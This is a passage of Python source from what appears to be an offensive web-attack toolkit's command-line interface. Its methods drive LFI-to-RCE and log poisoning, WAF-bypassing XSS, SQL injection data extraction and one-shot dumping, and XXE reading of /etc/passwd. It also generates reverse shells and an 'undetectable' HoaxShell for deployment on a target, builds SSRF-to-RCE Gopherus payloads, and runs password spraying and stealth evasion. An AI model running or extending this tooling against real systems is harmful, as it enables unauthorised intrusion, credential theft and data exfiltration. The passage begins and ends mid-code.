            rce_result = run_lfi_scan(url, parameter="file", scan_type="rce")
            log_result = run_lfi_scan(url, parameter="file", scan_type="log_poison")
        self.results['findings']['lfi_rce'] = {'rce': rce_result, 'log_poison': log_result}
        if rce_result.get('rce_achieved'):
            console.print(f"[bold red][!!!] RCE VIA PHP WRAPPER! Methods: {rce_result.get('rce_methods')}[/bold red]")
            console.print(f"  Output: {str(rce_result.get('command_output', ''))[:100]}")
        if log_result.get('rce_achieved'):
            console.print(f"[bold red][!!!] RCE VIA LOG POISONING![/bold red]")

    def _scan_xss_reflected(self):
        """XSS Reflected (Context-Aware + WAF Bypass)"""
        console.print(f"\n[bold cyan][*] Reflected XSS Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing context-aware XSS with WAF bypass...[/bold cyan]"):
            result = run_xss_scan(url, parameter="q", scan_type="reflected")
        self.results['findings']['xss_reflected'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] XSS VULNERABLE! Context: {result.get('injection_context')}[/bold red]")
            for p in result.get('successful_payloads', [])[:5]:
                if p.get('executable'):
                    console.print(f"  [red]EXECUTABLE: {p['payload'][:60]}[/red]")
        else:
            console.print("[green][+] No reflected XSS detected[/green]")

    def _scan_xss_dom(self):
        """DOM XSS Detection"""
        console.print(f"\n[bold cyan][*] DOM XSS Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Analyzing DOM sources and sinks...[/bold cyan]"):
            result = run_xss_scan(url, scan_type="dom")
        self.results['findings']['xss_dom'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] DOM XSS VULNERABLE![/bold red]")
            for flow in result.get('potential_flows', [])[:3]:
                console.print(f"  [yellow]Source: {flow['source']} -> Sink: {flow['sink']}[/yellow]")

    def _scan_xss_blind(self):
        """Blind XSS Testing"""
        console.print(f"\n[bold cyan][*] Blind XSS Testing on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Injecting blind XSS callbacks...[/bold cyan]"):
            result = run_xss_scan(url, scan_type="blind")
        self.results['findings']['xss_blind'] = result
        console.print(f"  [yellow]Payloads injected: {len(result.get('payloads_injected', []))}[/yellow]")

    def _scan_xss_full(self):
        """Full XSS Audit (Reflected + DOM + Blind)"""
        console.print(f"\n[bold red][*] FULL XSS AUDIT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running comprehensive XSS audit...[/bold red]"):
            result = run_xss_scan(url, scan_type="full")
        self.results['findings']['xss_full'] = result
        console.print(f"  [yellow]Vulnerabilities found: {result.get('vulnerabilities_found', 0)}[/yellow]")
        console.print(f"  [yellow]Total payloads tested: {result.get('total_payloads_tested', 0)}[/yellow]")

    def _scan_subdomain_passive(self):
        """Subdomain Passive Enumeration (10+ Sources)"""
        console.print(f"\n[bold cyan][*] Passive Subdomain Enum on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Querying 10+ passive sources...[/bold cyan]"):
            result = run_subdomain_scan(self.target, scan_type="passive")
        self.results['findings']['subdomain_passive'] = result
        console.print(f"  [green]Found {result.get('total_found', 0)} subdomains from {len(result.get('sources_used', {}))} sources[/green]")

    def _scan_subdomain_bruteforce(self):
        """Subdomain DNS Brute Force"""
        console.print(f"\n[bold cyan][*] DNS Brute Force on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Brute forcing subdomains...[/bold cyan]"):
            result = run_subdomain_scan(self.target, scan_type="brute_force")
        self.results['findings']['subdomain_brute'] = result
        console.print(f"  [green]Found {result.get('total_found', 0)} subdomains[/green]")

    def _scan_subdomain_full(self):
        """Full Subdomain Recon (Passive + Brute + Permutation + Takeover)"""
        console.print(f"\n[bold red][*] FULL SUBDOMAIN RECON on {self.target}[/bold red]")
        with console.status("[bold red]Running full subdomain enumeration...[/bold red]"):
            result = run_subdomain_scan(self.target, scan_type="full")
        self.results['findings']['subdomain_full'] = result
        console.print(f"  [green]Total: {result.get('total_subdomains', 0)} subdomains, {result.get('total_live', 0)} live, {result.get('total_takeover', 0)} takeover[/green]")

    def _scan_hash_identify_crypto(self):
        """Hash Type Identification (300+ types - Crypto Engine)"""
        console.print(f"\n[bold cyan][*] Hash Identification[/bold cyan]")
        hash_val = Prompt.ask("[yellow]Enter hash to identify[/yellow]")
        with console.status("[bold cyan]Identifying hash type...[/bold cyan]"):
            result = run_crypto_scan(hash_val, scan_type="identify")
        self.results['findings']['hash_identify'] = result
        if result.get('possible_types'):
            for t in result['possible_types'][:10]:
                console.print(f"  [green]Possible: {t}[/green]")
        else:
            console.print("[yellow][!] Could not identify hash type[/yellow]")

    def _scan_hash_crack(self):
        """Hash Cracking (Dictionary + Rules)"""
        console.print(f"\n[bold red][*] Hash Cracking[/bold red]")
        hash_val = Prompt.ask("[yellow]Enter hash to crack[/yellow]")
        with console.status("[bold red]Cracking hash with dictionary + 18 mutation rules...[/bold red]"):
            result = run_crypto_scan(hash_val, scan_type="crack")
        self.results['findings']['hash_crack'] = result
        if result.get('cracked'):
            console.print(f"[bold green][+] CRACKED! Plaintext: {result['plaintext']}[/bold green]")
        else:
            console.print(f"[yellow][!] Not cracked. Tested {result.get('mutations_tested', 0)} mutations[/yellow]")

    def _scan_auto_decode(self):
        """Auto-Decode (Base64/Hex/ROT13/Caesar/URL)"""
        console.print(f"\n[bold cyan][*] Auto-Decode[/bold cyan]")
        encoded = Prompt.ask("[yellow]Enter encoded string[/yellow]")
        with console.status("[bold cyan]Auto-detecting encoding...[/bold cyan]"):
            result = run_crypto_scan(encoded, scan_type="decode")
        self.results['findings']['auto_decode'] = result
        for dec in result.get('decodings', []):
            console.print(f"  [green]{dec['type']}: {dec['decoded'][:80]}[/green]")

    def _scan_reverse_shell(self):
        """Reverse Shell Generator (15+ languages)"""
        console.print(f"\n[bold red][*] Reverse Shell Generator[/bold red]")
        lhost = Prompt.ask("[yellow]LHOST (your IP)[/yellow]", default="10.0.0.1")
        lport = Prompt.ask("[yellow]LPORT[/yellow]", default="4444")
        shell_type = Prompt.ask("[yellow]Shell type[/yellow]", default="bash_tcp",
                               choices=["bash_tcp", "python3", "perl", "php_exec", "nc_mkfifo",
                                        "powershell", "socat", "ruby", "java"])
        engine = ReverseShellEngine(lhost=lhost, lport=int(lport), shell_type=shell_type)
        result = engine.generate()
        self.results['findings']['reverse_shell'] = result
        console.print(f"\n[bold green]Payload:[/bold green]")
        console.print(f"  {result.get('payload', '')[:200]}")
        if result.get('obfuscated'):
            console.print(f"\n[bold yellow]Obfuscated:[/bold yellow]")
            console.print(f"  {result['obfuscated'][:200]}")

    def _scan_hoaxshell(self):
        """HoaxShell Undetectable Reverse Shell"""
        console.print(f"\n[bold red][*] HoaxShell Undetectable Shell Generator[/bold red]")
        lhost = Prompt.ask("[yellow]LHOST (your IP)[/yellow]", default="10.0.0.1")
        lport = Prompt.ask("[yellow]LPORT[/yellow]", default="4443")
        engine = ReverseShellEngine(lhost=lhost, lport=int(lport))
        result = engine.generate_hoaxshell()
        self.results['findings']['hoaxshell'] = result
        console.print(f"[bold green]Session ID: {result['session_id']}[/bold green]")
        console.print(f"[yellow]Server code saved - run on attacker machine[/yellow]")
        console.print(f"[yellow]Client payload - deploy on target[/yellow]")

    def _scan_cms_detect(self):
        """CMS Detection (180+ CMS)"""
        console.print(f"\n[bold cyan][*] CMS Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting CMS from 180+ signatures...[/bold cyan]"):
            result = run_cms_scan(url, scan_type="detect")
        self.results['findings']['cms_detect'] = result
        for cms in result.get('detected_cms', []):
            console.print(f"  [green][+] {cms['name']} v{cms.get('version', '?')} (via {cms['method']})[/green]")
        for tech in result.get('technologies', []):
            console.print(f"  [cyan]{tech}[/cyan]")

    def _scan_cms_wordpress(self):
        """WordPress Deep Scan"""
        console.print(f"\n[bold red][*] WordPress Deep Scan on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Scanning WordPress (plugins, users, config)...[/bold red]"):
            result = run_cms_scan(url, scan_type="wordpress")
        self.results['findings']['cms_wordpress'] = result
        for f in result.get('findings', []):
            color = "red" if f['risk'] in ['critical', 'high'] else "yellow"
            console.print(f"  [{color}][{f['risk'].upper()}] {f['finding']}[/{color}]")

    def _scan_cms_full(self):
        """Full CMS Audit (Auto-detect + Deep Scan)"""
        console.print(f"\n[bold red][*] FULL CMS AUDIT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full CMS audit...[/bold red]"):
            result = run_cms_scan(url, scan_type="full")
        self.results['findings']['cms_full'] = result

    def _scan_osint_emails(self):
        """OSINT Email Harvesting"""
        console.print(f"\n[bold cyan][*] OSINT Email Harvesting for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Harvesting emails from multiple sources...[/bold cyan]"):
            result = run_osint_scan(self.target, scan_type="emails")
        self.results['findings']['osint_emails'] = result
        console.print(f"  [green]Found {len(result.get('emails', []))} emails from {len(result.get('sources', {}))} sources[/green]")

    def _scan_osint_dorks(self):
        """Google Dork Scanner"""
        console.print(f"\n[bold cyan][*] Google Dork Scanner for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Running Google dork scans...[/bold cyan]"):
            result = run_osint_scan(self.target, scan_type="dorks")
        self.results['findings']['osint_dorks'] = result
        for finding in result.get('findings', [])[:10]:
            console.print(f"  [yellow][{finding['category']}] {finding.get('results_count', 0)} results[/yellow]")

    def _scan_osint_full(self):
        """Full OSINT Recon"""
        console.print(f"\n[bold red][*] FULL OSINT RECON on {self.target}[/bold red]")
        with console.status("[bold red]Running comprehensive OSINT reconnaissance...[/bold red]"):
            result = run_osint_scan(self.target, scan_type="full")
        self.results['findings']['osint_full'] = result

    def _scan_cloud_metadata(self):
        """Cloud Metadata Extraction (SSRF)"""
        console.print(f"\n[bold cyan][*] Cloud Metadata Extraction on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Extracting cloud metadata (AWS/GCE/Azure/DO/Oracle)...[/bold cyan]"):
            result = run_cloud_scan(url, scan_type="metadata")
        self.results['findings']['cloud_metadata'] = result
        if result.get('cloud_provider'):
            console.print(f"  [green][+] Cloud Provider: {result['cloud_provider']}[/green]")
            for key, val in result.get('metadata_extracted', {}).items():
                console.print(f"  [cyan]{key}: {str(val)[:80]}[/cyan]")

    def _scan_cloud_s3(self):
        """AWS S3 Bucket Enumeration"""
        console.print(f"\n[bold cyan][*] S3 Bucket Enumeration for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Enumerating S3 buckets...[/bold cyan]"):
            result = run_cloud_scan(self.target, scan_type="s3")
        self.results['findings']['cloud_s3'] = result
        for bucket in result.get('buckets_found', []):
            console.print(f"  [green][+] {bucket['name']} ({bucket['status']})[/green]")

    def _scan_cloud_gopherus(self):
        """Gopherus SSRF-to-RCE Payloads"""
        console.print(f"\n[bold red][*] Gopherus SSRF-to-RCE Payload Generator[/bold red]")
        service = Prompt.ask("[yellow]Service[/yellow]", default="redis",
                           choices=["mysql", "redis", "fastcgi", "postgresql", "smtp", "zabbix"])
        host = Prompt.ask("[yellow]Target host[/yellow]", default="127.0.0.1")
        engine = CloudSecurityEngine(target=self.target)
        result = engine.generate_gopherus_payload(service=service, host=host)
        self.results['findings']['gopherus'] = result
        for p in result.get('payloads', []):
            console.print(f"  [red]{p['type']}: {p.get('payload', '')[:100]}[/red]")

    def _scan_cloud_full(self):
        """Full Cloud Security Audit"""
        console.print(f"\n[bold red][*] FULL CLOUD SECURITY AUDIT on {self.target}[/bold red]")
        with console.status("[bold red]Running comprehensive cloud audit...[/bold red]"):
            result = run_cloud_scan(self.target, scan_type="full")
        self.results['findings']['cloud_full'] = result

    def _scan_cors_misconfig(self):
        """CORS Misconfiguration Detection"""
        console.print(f"\n[bold cyan][*] CORS Misconfiguration on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing CORS with 15+ origin payloads...[/bold cyan]"):
            result = run_cors_scan(url, scan_type="cors")
        self.results['findings']['cors_misconfig'] = result
        if result.get('vulnerable'):
            for m in result.get('misconfigurations', []):
                console.print(f"  [red][{m.get('severity', '?').upper()}] {m.get('type', 'unknown')}: {m['origin_tested']}[/red]")
        else:
            console.print("[green][+] No CORS misconfiguration detected[/green]")

    def _scan_open_redirect_adv(self):
        """Advanced Open Redirect (30+ Bypass Techniques)"""
        console.print(f"\n[bold cyan][*] Advanced Open Redirect on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing 30+ redirect bypass techniques...[/bold cyan]"):
            result = run_cors_scan(url, scan_type="redirect")
        self.results['findings']['open_redirect_adv'] = result
        if result.get('vulnerable'):
            for v in result.get('vulnerable_params', []):
                console.print(f"  [red]Param '{v['parameter']}': {v['payload'][:50]} -> {v['redirect_to'][:50]}[/red]")
        else:
            console.print("[green][+] No open redirect detected[/green]")

    def _scan_xxe_detect(self):
        """XXE Detection"""
        console.print(f"\n[bold cyan][*] XXE Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing XXE payloads (in-band, error, PHP wrappers)...[/bold cyan]"):
            result = run_xxe_scan(url, scan_type="detect")
        self.results['findings']['xxe_detect'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] XXE VULNERABLE! Type: {result.get('type')}[/bold red]")
        else:
            console.print("[green][+] No XXE detected[/green]")

    def _scan_xxe_extract(self):
        """XXE File Extraction"""
        console.print(f"\n[bold red][*] XXE File Extraction on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        file_path = Prompt.ask("[yellow]File to extract[/yellow]", default="/etc/passwd")
        with console.status("[bold red]Extracting file via XXE...[/bold red]"):
            result = run_xxe_scan(url, scan_type="extract", file_path=file_path)
        self.results['findings']['xxe_extract'] = result
        if result.get('extracted'):
            console.print(f"[bold green][+] File extracted! Length: {len(result.get('content', ''))}[/bold green]")
            console.print(f"  Preview: {str(result.get('content', ''))[:200]}")

    def _scan_xxe_deser(self):
        """XXE + Deserialization Detection"""
        console.print(f"\n[bold cyan][*] XXE + Deserialization Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing XXE and deserialization...[/bold cyan]"):
            result = run_xxe_scan(url, scan_type="full")
        self.results['findings']['xxe_deser'] = result

    def _scan_ssti_sandbox(self):
        """SSTI Sandbox Escape (Tplmap + SSTI-Finder)"""
        console.print(f"\n[bold red][*] SSTI Sandbox Escape on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing SSTI sandbox escapes for 17+ engines...[/bold red]"):
            result = run_advanced_web_scan(url, scan_type="ssti")
        self.results['findings']['ssti_sandbox'] = result
        if result.get('rce_achieved'):
            console.print(f"[bold red][!!!] SSTI RCE ACHIEVED! Engine: {result.get('engine')}[/bold red]")

    def _scan_proto_pollution_adv(self):
        """Prototype Pollution Detection (Advanced)"""
        console.print(f"\n[bold cyan][*] Prototype Pollution on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing prototype pollution + DOM clobbering...[/bold cyan]"):
            result = run_advanced_web_scan(url, scan_type="prototype_pollution")
        self.results['findings']['proto_pollution'] = result

    def _scan_csp_analysis(self):
        """CSP Bypass Analysis"""
        console.print(f"\n[bold cyan][*] CSP Bypass Analysis on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Analyzing Content Security Policy...[/bold cyan]"):
            result = run_advanced_web_scan(url, scan_type="csp")
        self.results['findings']['csp_analysis'] = result
        for opp in result.get('bypass_opportunities', []):
            console.print(f"  [yellow][{opp.get('severity', '?').upper()}] {opp['technique']}: {opp['description'][:60]}[/yellow]")

    def _scan_cache_poison_adv(self):
        """Advanced Cache Poisoning Detection"""
        console.print(f"\n[bold cyan][*] Cache Poisoning on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing cache poisoning with unkeyed headers...[/bold cyan]"):
            result = run_advanced_web_scan(url, scan_type="cache_poison")
        self.results['findings']['cache_poison_adv'] = result

    def _scan_blind_sqli_headers(self):
        """Blind SQLi via HTTP Headers (Blisqy + SqliSniper)"""
        console.print(f"\n[bold cyan][*] Blind SQLi Header Testing on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing blind SQLi via HTTP headers...[/bold cyan]"):
            result = run_advanced_web_scan(url, scan_type="blind_sqli_headers")
        self.results['findings']['blind_sqli_headers'] = result
        if result.get('vulnerable'):
            for v in result.get('vulnerable_headers', []):
                console.print(f"  [red]Header '{v['header']}': Delay {v.get('delay', '?')}s[/red]")

    def _scan_git_exposure(self):
        """Git/SVN/HG Exposure Detection"""
        console.print(f"\n[bold cyan][*] Git/SVN/HG Exposure on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Checking for VCS directory exposure...[/bold cyan]"):
            result = run_git_scan(url, scan_type="vcs")
        self.results['findings']['git_exposure'] = result
        for vcs in result.get('vcs_exposed', []):
            console.print(f"  [red][!!!] {vcs['vcs'].upper()} exposed: {vcs['path']} (Risk: {vcs['risk']})[/red]")

    def _scan_sensitive_files_adv(self):
        """Advanced Sensitive File Detection (30+ files)"""
        console.print(f"\n[bold cyan][*] Sensitive File Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Scanning 30+ sensitive file paths...[/bold cyan]"):
            result = run_git_scan(url, scan_type="sensitive")
        self.results['findings']['sensitive_files_adv'] = result
        for f in result.get('files_found', []):
            console.print(f"  [yellow][{f['risk'].upper()}] {f['path']} ({f['size']} bytes)[/yellow]")

    def _scan_github_dork_adv(self):
        """GitHub Secret Dorking (GitDorker-style)"""
        console.print(f"\n[bold cyan][*] GitHub Secret Dorking for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Searching GitHub for leaked secrets...[/bold cyan]"):
            result = run_git_scan(self.target, scan_type="github_dork")
        self.results['findings']['github_dork_adv'] = result
        for finding in result.get('findings', [])[:10]:
            console.print(f"  [red]{finding.get('file', '?')} in {finding.get('repo', '?')}[/red]")

    def _scan_oast_callback(self):
        """OAST Blind Callback Testing"""
        console.print(f"\n[bold cyan][*] OAST Blind Callback Testing on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Injecting OAST callbacks...[/bold cyan]"):
            result = run_utility_scan(url, scan_type="oast", parameter="url")
        self.results['findings']['oast_callback'] = result
        console.print(f"  [yellow]Payloads injected: {len(result.get('payloads_injected', []))}[/yellow]")
        console.print(f"  [yellow]{result.get('note', '')}[/yellow]")

    def _scan_redos(self):
        """ReDoS Vulnerability Detection"""
        console.print(f"\n[bold cyan][*] ReDoS Vulnerability Detection[/bold cyan]")
        with console.status("[bold cyan]Testing regex patterns for catastrophic backtracking...[/bold cyan]"):
            result = run_utility_scan(self.target, scan_type="redos")
        self.results['findings']['redos'] = result
        for p in result.get('vulnerable_patterns', []):
            console.print(f"  [red][{p['severity'].upper()}] {p['name']}: {p['pattern']} ({p['max_eval_time']}s)[/red]")

    def _scan_password_spray(self):
        """Password Spraying / Credential Testing"""
        console.print(f"\n[bold red][*] Password Spraying on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        usernames = Prompt.ask("[yellow]Usernames (comma-separated)[/yellow]", default="admin")
        user_list = [u.strip() for u in usernames.split(",")]
        with console.status("[bold red]Testing credentials...[/bold red]"):
            result = run_utility_scan(url, scan_type="spray", usernames=user_list)
        self.results['findings']['password_spray'] = result
        for login in result.get('successful_logins', []):
            console.print(f"  [bold red][!!!] CREDS: {login['username']}:{login['password']}[/bold red]")

    def _scan_stealth(self):
        """Stealth Scanning (Evasion + Timing)"""
        console.print(f"\n[bold cyan][*] Stealth Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        profile = Prompt.ask("[yellow]Stealth profile[/yellow]", default="cautious",
                           choices=["normal", "cautious", "sneaky", "paranoid"])
        with console.status("[bold cyan]Scanning with stealth profile...[/bold cyan]"):
            result = run_utility_scan(url, scan_type="stealth", profile=profile)
        self.results['findings']['stealth'] = result

    def _scan_wordlist_gen(self):
        """Custom Wordlist Generation"""
        console.print(f"\n[bold cyan][*] Wordlist Generator for {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Crawling target and generating wordlist...[/bold cyan]"):
            result = run_utility_scan(url, scan_type="wordlist")
        self.results['findings']['wordlist'] = result
        console.print(f"  [green]Generated {result.get('words_collected', 0)} words[/green]")

    def _scan_adv_web_full(self):
        """Full Advanced Web Audit (SSTI + PP + CSP + Cache + BlindSQLi)"""
        console.print(f"\n[bold red][*] FULL ADVANCED WEB AUDIT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running comprehensive advanced web audit...[/bold red]"):
            result = run_advanced_web_scan(url, scan_type="full")
        self.results['findings']['adv_web_full'] = result
        console.print(f"[bold green][+] Advanced Web Audit Complete![/bold green]")

    # ========================================================================
    # v5.0 FUSION - SQLMAP + XSSSTRIKE SCAN METHODS (144-153)
    # ========================================================================

    def _scan_sqli_detection(self):
        """SQLi Detection - SQLMap-style 6 technique detection"""
        console.print(f"\n[bold cyan][*] SQLi Detection (SQLMap-style) on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test[/yellow]", default="id")
        with console.status("[bold cyan]Testing 6 SQLi techniques (boolean blind, time blind, error, UNION, stacked, inline)...[/bold cyan]"):
            result = run_sqlmap_scan(url, scan_type='detect', param=param)
        self.results['findings']['sqli_detection'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] SQLi DETECTED! Techniques: {', '.join(result.get('techniques_vulnerable', []))}[/bold red]")
            for f in result.get('findings', [])[:5]:
                console.print(f"  [red]*[/red] [{f.get('technique','')}] {f.get('payload','')[:80]}")
        else:
            console.print("[green][+] No SQLi vulnerability detected[/green]")

    def _scan_sqli_exploitation(self):
        """SQLi Exploitation - Database + Table Extraction"""
        console.print(f"\n[bold red][*] SQLi Exploitation (DB Extraction) on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to exploit[/yellow]", default="id")
        with console.status("[bold red]Fingerprinting database and extracting data...[/bold cyan]"):
            # First fingerprint, then extract
            fp_result = run_sqlmap_scan(url, scan_type='fingerprint', param=param)
            db_type = fp_result.get('details', {}).get('db_type')
            if db_type:
                console.print(f"  [cyan]Database: {db_type}[/cyan]")
            result = run_sqlmap_scan(url, scan_type='extract', param=param, db_type=db_type)
        self.results['findings']['sqli_exploitation'] = {'fingerprint': fp_result, 'extraction': result}
        if result.get('vulnerable'):
            dbs = result.get('details', {}).get('databases', [])
            tables = result.get('details', {}).get('tables', {})
            console.print(f"[bold red][!!!] DATA EXTRACTED![/bold red]")
            if dbs:
                console.print(f"  [yellow]Databases: {', '.join(dbs[:10])}[/yellow]")
            for db_name, tbl_list in tables.items():
                console.print(f"  [cyan]Tables ({db_name}): {', '.join(tbl_list[:10])}[/cyan]")
        else:
            console.print("[yellow][!] Data extraction not successful[/yellow]")

    def _scan_sqli_dios(self):
        """SQLi DIOS - Dump In One Shot"""
        console.print(f"\n[bold red][*] SQLi DIOS (Dump In One Shot) on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to exploit[/yellow]", default="id")
        with console.status("[bold red]Attempting Dump In One Shot attack...[/bold red]"):
            result = run_sqlmap_scan(url, scan_type='dios', param=param)
        self.results['findings']['sqli_dios'] = result
        if result.get('vulnerable'):
            data = result.get('details', {}).get('data_dumped', {}).get('raw', '')
            console.print(f"[bold red][!!!] DIOS SUCCESSFUL! Extracted {len(data)} bytes[/bold red]")
            if data:
                console.print(f"  [yellow]Preview: {data[:200]}[/yellow]")
        else:
            console.print("[yellow][!] DIOS attack did not succeed[/yellow]")

    def _scan_sqli_waf_bypass(self):
        """SQLi WAF Bypass - Detect WAF and test bypass payloads"""
        console.print(f"\n[bold cyan][*] SQLi WAF Bypass on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test[/yellow]", default="id")
        with console.status("[bold cyan]Detecting WAF and testing bypass payloads...[/bold cyan]"):
            result = run_sqlmap_scan(url, scan_type='waf_bypass', param=param)
        self.results['findings']['sqli_waf_bypass'] = result
        waf = result.get('details', {}).get('waf_detected')
        if waf:
            console.print(f"[bold yellow][!] WAF Detected: {waf}[/bold yellow]")
            tampers = result.get('details', {}).get('recommended_tampers', [])
            if tampers:
                console.print(f"  [cyan]Recommended tampers: {', '.join(tampers)}[/cyan]")
            if result.get('details', {}).get('bypass_successful'):
                console.print(f"[bold red][!!!] WAF BYPASS SUCCESSFUL![/bold red]")
                for f in result.get('findings', [])[:3]:
                    console.print(f"  [red]*[/red] {f.get('payload', '')[:80]}")
        else:
            console.print("[green][+] No WAF detected[/green]")

    def _scan_xss_reflected_adv(self):
        """XSS Reflected Advanced - XSStrike-style context-aware testing"""
        console.print(f"\n[bold cyan][*] XSS Reflected Advanced (XSStrike-style) on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test[/yellow]", default="q")
        with console.status("[bold cyan]Testing reflected XSS with context-aware payloads...[/bold cyan]"):
            result = run_xssstrike_scan(url, scan_type='reflected', param=param)
        self.results['findings']['xss_reflected_adv'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] REFLECTED XSS CONFIRMED![/bold red]")
            ctx = result.get('details', {}).get('injection_context', 'unknown')
            console.print(f"  [cyan]Context: {ctx}[/cyan]")
            for p in result.get('details', {}).get('successful_payloads', [])[:5]:
                if p.get('executable'):
                    console.print(f"  [red]*[/red] {p.get('payload', '')[:80]}")
        else:
            reflected = result.get('details', {}).get('partial_reflections', [])
            if reflected:
                console.print(f"[yellow][!] {len(reflected)} partial reflections (not executable)[/yellow]")
            else:
                console.print("[green][+] No reflected XSS detected[/green]")

    def _scan_xss_dom_adv(self):
        """XSS DOM Advanced - Source/Sink Analysis"""
        console.print(f"\n[bold cyan][*] XSS DOM Advanced (Source/Sink Analysis) on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Analyzing DOM for source->sink flows...[/bold cyan]"):
            result = run_xssstrike_scan(url, scan_type='dom')
        self.results['findings']['xss_dom_adv'] = result
        if result.get('vulnerable'):
            sources = result.get('details', {}).get('sources_found', [])
            sinks = result.get('details', {}).get('sinks_found', [])
            flows = result.get('details', {}).get('potential_flows', [])
            console.print(f"[bold red][!!!] DOM XSS POTENTIAL DETECTED![/bold red]")
            console.print(f"  [cyan]Sources: {', '.join(sources[:5])}[/cyan]")
            console.print(f"  [cyan]Sinks: {', '.join(sinks[:5])}[/cyan]")
            console.print(f"  [red]Potential flows: {len(flows)}[/red]")
            for flow in flows[:3]:
                console.print(f"  [yellow]-> {flow.get('source','')} -> {flow.get('sink','')}[/yellow]")
        else:
            console.print("[green][+] No DOM XSS detected[/green]")

    def _scan_xss_blind_adv(self):
        """XSS Blind Advanced - Callback Testing"""
        console.print(f"\n[bold cyan][*] XSS Blind Advanced on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        callback = Prompt.ask("[yellow]Callback URL (e.g. interactsh URL, or press Enter to skip)[/yellow]", default="")
        with console.status("[bold cyan]Injecting blind XSS payloads...[/bold cyan]"):
            kwargs = {}
            if callback:
                kwargs['callback_url'] = callback
            result = run_xssstrike_scan(url, scan_type='blind', **kwargs)
        self.results['findings']['xss_blind_adv'] = result
        injected = result.get('details', {}).get('payloads_injected', [])
        inj_points = result.get('details', {}).get('injection_points', [])
        console.print(f"  [cyan]Payloads injected: {len(injected)}[/cyan]")
        console.print(f"  [cyan]Injection points: {len(inj_points)}[/cyan]")
        if not callback:
            console.print(f"  [yellow]Note: No callback URL - use interactsh or custom callback for confirmation[/yellow]")

    def _scan_xss_context_aware(self):
        """XSS Context-Aware Fuzzing"""
        console.print(f"\n[bold cyan][*] XSS Context-Aware Fuzzing on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to fuzz[/yellow]", default="q")
        with console.status("[bold cyan]Detecting context and generating targeted payloads...[/bold cyan]"):
            result = run_xssstrike_scan(url, scan_type='context_aware', param=param)
        self.results['findings']['xss_context_aware'] = result
        ctx = result.get('details', {}).get('injection_context', 'unknown')
        tested = result.get('details', {}).get('payloads_tested', 0)
        reflections = result.get('details', {}).get('reflections', [])
        confirmed = result.get('details', {}).get('confirmed_xss', [])
        console.print(f"  [cyan]Context: {ctx}[/cyan]")
        console.print(f"  [cyan]Payloads tested: {tested}[/cyan]")
        console.print(f"  [cyan]Reflections: {len(reflections)}[/cyan]")
        if confirmed:
            console.print(f"[bold red][!!!] CONFIRMED XSS: {len(confirmed)} payloads[/bold red]")
            for c in confirmed[:5]:
                console.print(f"  [red]*[/red] {c.get('payload','')[:80]}")
        else:
            console.print("[green][+] No confirmed XSS in context-aware fuzzing[/green]")

    def _scan_xss_full_adv(self):
        """XSS Full Scan - All XSS types (XSStrike-style)"""
        console.print(f"\n[bold red][*] XSS FULL SCAN (XSStrike-style) on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test[/yellow]", default="q")
